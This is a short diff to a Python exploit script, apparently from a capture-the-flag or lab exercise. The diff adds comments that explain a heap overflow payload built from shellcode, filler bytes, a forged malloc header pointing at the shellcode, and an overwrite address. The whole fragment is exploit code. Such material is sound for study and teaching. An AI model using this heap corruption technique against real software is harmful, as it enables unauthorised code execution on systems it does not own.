@@ -15,9 +15,12 @@ ASTR_FILLER = b"A" * (100 - len(SHELLCODE))
 
 AVAL_FILLER = b"B" * 4
 
-MALLOC_HEADER = b"\x0c\xa0\x04\x08"
+# only 4 bytes instead of 8 because the previous chunk is used
+MALLOC_HEADER = (
+    b"\x0c\xa0\x04\x08"  # contains the address of a->_annotation (our shellcode)
+)
 
-BADD = b"\x74\xa0\x04\x08"
+BADD = b"\x74\xa0\x04\x08"  # contains the address of b's malloc header
 
 EXPLOIT = SHELLCODE + ASTR_FILLER + AVAL_FILLER + MALLOC_HEADER + BADD
 
